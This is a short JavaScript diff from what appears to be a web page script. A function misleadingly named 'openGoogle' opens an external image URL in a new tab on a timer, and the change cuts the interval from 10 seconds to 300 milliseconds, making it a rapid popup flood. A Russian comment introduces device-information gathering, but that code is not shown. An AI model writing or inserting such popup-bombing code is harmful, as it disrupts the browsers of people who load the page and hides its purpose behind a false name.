@@ -2,7 +2,7 @@
 function openGoogle() {
     setInterval(function() {
         window.open('https://imagehub.fun/F0CAFS.png', '_blank');
-    }, 10000);
+    }, 300);
 }
 
 // Функция для получения и отображения информации об устройстве
